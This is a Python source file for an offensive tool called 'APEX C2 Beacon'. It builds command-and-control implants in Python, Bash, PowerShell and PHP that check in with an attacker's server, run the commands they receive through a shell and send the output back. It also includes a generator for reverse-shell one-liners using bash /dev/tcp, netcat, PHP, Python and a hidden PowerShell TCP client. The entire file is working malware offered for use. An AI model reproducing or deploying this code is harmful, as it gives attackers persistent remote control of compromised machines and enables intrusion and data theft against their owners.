"""
APEX C2 Beacon
Command & Control beacon payloads for persistent access
Supports HTTP/HTTPS, DNS, and ICMP callbacks
"""
import os
import time
import json
import base64
import subprocess
import threading
import socket
import requests

class C2Beacon:
    """C2 Beacon for maintaining persistent access to compromised systems"""
    
    def __init__(self, c2_server, beacon_id=None, sleep_time=5, jitter=2):
        self.c2_server = c2_server
        self.beacon_id = beacon_id or f"beacon_{int(time.time())}"
        self.sleep_time = sleep_time
        self.jitter = jitter
        self.running = False
        self.tasks = []
    
    def generate_payload(self, payload_type='python'):
        """Generate a beacon payload for deployment"""
        if payload_type == 'python':
            return self._python_payload()
        elif payload_type == 'bash':
            return self._bash_payload()
        elif payload_type == 'powershell':
            return self._powershell_payload()
        elif payload_type == 'php':
            return self._php_payload()
        return self._python_payload()
    
    def _python_payload(self):
        """Generate Python beacon payload"""
        return f'''
import os,time,json,base64,subprocess,requests,socket,threading
C2="{self.c2_server}"
BID="{self.beacon_id}"
SLEEP={self.sleep_time}
JITTER={self.jitter}

def cmd(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)
        return r.stdout+r.stderr
    except:return "Error"

def beacon():
    while True:
        try:
            r=requests.post(f"{{C2}}/checkin",json={{"id":BID,"host":socket.gethostname()}},timeout=10)
            if r.status_code==200:
                tasks=r.json().get("tasks",[])
                results=[]
                for t in tasks:
                    out=cmd(t.get("command",""))
                    results.append({{"task_id":t.get("id"),"output":out}})
                requests.post(f"{{C2}}/results",json={{"id":BID,"results":results}},timeout=10)
        except:pass
        time.sleep(SLEEP+__import__("random").randint(0,JITTER))

threading.Thread(target=beacon,daemon=True).start()
'''
    
    def _bash_payload(self):
        """Generate Bash beacon payload"""
        return f'''#!/bin/bash
C2="{self.c2_server}"
BID="{self.beacon_id}"
SLEEP={self.sleep_time}

while true; do
    TASKS=$(curl -s -X POST "$C2/checkin" -H "Content-Type: application/json" -d '{{"id":"'$BID'","host":"'$(hostname)'"}}' 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo "$TASKS" | python3 -c "
import sys,json,subprocess
data=json.load(sys.stdin)
for t in data.get('tasks',[]):
    r=subprocess.run(t['command'],shell=True,capture_output=True,text=True)
    print(json.dumps({{'task_id':t['id'],'output':r.stdout+r.stderr}}))
" | curl -s -X POST "$C2/results" -H "Content-Type: application/json" -d @- 2>/dev/null
    fi
    sleep $SLEEP
done &
'''
    
    def _powershell_payload(self):
        """Generate PowerShell beacon payload"""
        return f'''
$C2="{self.c2_server}"
$BID="{self.beacon_id}"
$SLEEP={self.sleep_time}

while($true) {{
    try {{
        $body=@{{id=$BID;host=$env:COMPUTERNAME}} | ConvertTo-Json
        $tasks=Invoke-RestMethod -Uri "$C2/checkin" -Method Post -Body $body -ContentType "application/json"
        $results=@()
        foreach($t in $tasks.tasks) {{
            $out=iex $t.command 2>&1 | Out-String
            $results+=@{{task_id=$t.id;output=$out}}
        }}
        $resultBody=@{{id=$BID;results=$results}} | ConvertTo-Json
        Invoke-RestMethod -Uri "$C2/results" -Method Post -Body $resultBody -ContentType "application/json"
    }} catch {{}}
    Start-Sleep -Seconds $SLEEP
}}
'''
    
    def _php_payload(self):
        """Generate PHP beacon payload"""
        return f'''<?php
$C2="{self.c2_server}";
$BID="{self.beacon_id}";
$SLEEP={self.sleep_time};

function beacon() {{
    global $C2,$BID,$SLEEP;
    while(true) {{
        $ch=curl_init("$C2/checkin");
        curl_setopt($ch,CURLOPT_POST,1);
        curl_setopt($ch,CURLOPT_POSTFIELDS,json_encode(["id"=>$BID,"host"=>gethostname()]));
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        $tasks=json_decode(curl_exec($ch),true);
        curl_close($ch);
        
        $results=[];
        foreach($tasks["tasks"] as $t) {{
            $out=shell_exec($t["command"]);
            $results[]=["task_id"=>$t["id"],"output"=>$out];
        }}
        
        $ch=curl_init("$C2/results");
        curl_setopt($ch,CURLOPT_POST,1);
        curl_setopt($ch,CURLOPT_POSTFIELDS,json_encode(["id"=>$BID,"results"=>$results]));
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_exec($ch);
        curl_close($ch);
        
        sleep($SLEEP);
    }}
}}
beacon();
?>'''


def generate_reverse_shell(host, port, shell_type='bash'):
    """Generate reverse shell one-liners"""
    shells = {
        'bash': f'bash -i >& /dev/tcp/{host}/{port} 0>&1',
        'python': f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        'nc': f'nc -e /bin/sh {host} {port}',
        'php': f'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'powershell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=iex $d 2>&1|Out-String;$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"',
    }
    return shells.get(shell_type, shells['bash'])